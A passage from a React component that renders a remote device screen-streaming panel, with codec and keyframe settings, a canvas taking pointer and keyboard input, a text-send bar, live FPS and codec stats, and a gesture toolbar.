              { label: 'Keyframe interval', val: iframeInt, set: setIframeInt, min: 0, max: 10 },
            ].map(({ label, val, set, min, max }) => (
              <div key={label} className="space-y-1">
                <Label className="text-xs">{label}</Label>
                <Input type="number" value={val} min={min} max={max} disabled={streaming}
                  onChange={e => set(Math.max(min, Math.min(max, parseInt(e.target.value) || val)))}
                  className="h-8 text-xs" />
              </div>
            ))}
          </div>
          <div className="flex items-center gap-3 mt-3">
            <label className="flex items-center gap-2 cursor-pointer select-none">
              <input type="checkbox" checked={useH265} disabled={streaming}
                onChange={e => setUseH265(e.target.checked)} className="accent-primary" />
              <span className="text-xs font-medium">H.265 (HEVC)</span>
            </label>
            {h265ok === true  && <span className="text-[10px] text-green-500">✓ Browser supported</span>}
            {h265ok === false && <span className="text-[10px] text-zinc-500">Not available in this browser (H.264 used)</span>}
          </div>
          {streaming && <p className="text-[10px] text-muted-foreground mt-2">Stop stream to change settings. Presets restart stream automatically.</p>}
        </SectionCard>
      )}

      {/* ── Main screen panel ─────────────────────────────────────────── */}
      <div
        ref={containerRef}
        className={`rounded-xl overflow-hidden border border-zinc-800 bg-black shadow-2xl select-none
          ${fullscreen ? 'fixed inset-0 z-50 rounded-none border-none' : ''}`}
      >
        {/* Canvas area */}
        <div className="relative bg-black flex items-center justify-center"
          style={{ minHeight: fullscreen ? '100dvh' : 320 }}>

          {streaming ? (
            <canvas
              ref={canvasRef}
              tabIndex={0}
              onPointerDown={onPointerDown}
              onPointerMove={onPointerMove}
              onPointerUp={onPointerUp}
              onPointerCancel={onPointerCancel}
              onKeyDown={onKeyDown}
              aria-label="Remote device screen"
              className={`touch-none cursor-crosshair focus:outline-none
                ${fullscreen ? 'w-full h-full object-contain' : 'max-w-full max-h-[65vh]'}`}
              style={{ display: 'block', imageRendering: 'auto' }}
            />
          ) : (
            <EmptyState
              icon={Monitor}
              title={status === 'starting' ? 'Waiting for device…' : 'Stream stopped'}
              description={status === 'starting' ? 'Establishing connection' : 'Click Start to begin'}
              action={status !== 'starting'
                ? { label: 'Start Stream', onClick: () => startStream(), disabled: !canAct }
                : undefined}
            />
          )}

          {/* Overlay stats */}
          {streaming && (
            <div className="absolute top-2 right-2 pointer-events-none flex items-center gap-1.5 bg-black/50 rounded px-2 py-0.5 backdrop-blur-sm">
              <Zap className="h-2.5 w-2.5 text-green-400" />
              <span className="text-[10px] font-mono text-green-400">{measuredFps}fps</span>
              <span className="text-[10px] font-mono text-blue-300">{liveCodec.toUpperCase()}</span>
              {socketReady && <span className="text-[10px] font-mono text-cyan-400">WS</span>}
            </div>
          )}
        </div>

        {/* Text input bar */}
        {streaming && showTextInput && (
          <div className="flex gap-2 px-3 py-2 bg-zinc-900/95 border-t border-zinc-800">
            <input
              className="flex-1 h-8 text-xs bg-zinc-800 border border-zinc-700 rounded px-2 text-white
                         placeholder:text-zinc-500 focus:outline-none focus:border-zinc-500"
              placeholder="Type to send to device (Enter to send)…"
              value={textInput}
              onChange={e => setTextInput(e.target.value)}
              onKeyDown={e => { if (e.key === 'Enter') { e.preventDefault(); sendText(); } }}
              autoFocus
            />
            <Button size="sm" onClick={sendText} disabled={!textInput} className="h-8 px-3 text-xs shrink-0">Send</Button>
            <Button size="sm" variant="ghost" onClick={() => setShowTextInput(false)} className="h-8 w-8 p-0 text-zinc-500">✕</Button>
          </div>
        )}

        {/* Gesture toolbar — only shown when streaming */}
        {streaming && <Toolbar />}

        {/* Hint bar when idle */}
        {!streaming && (
          <div className="px-3 py-2 bg-zinc-900/50 border-t border-zinc-800 flex items-center gap-2 text-[10px] text-zinc-500">
            <MousePointerClick className="h-3 w-3" />
            Tap · Hold · Double-tap · Drag · Pinch · Volume keys (↑↓)
          </div>
        )}
      </div>
    </div>
  );
}
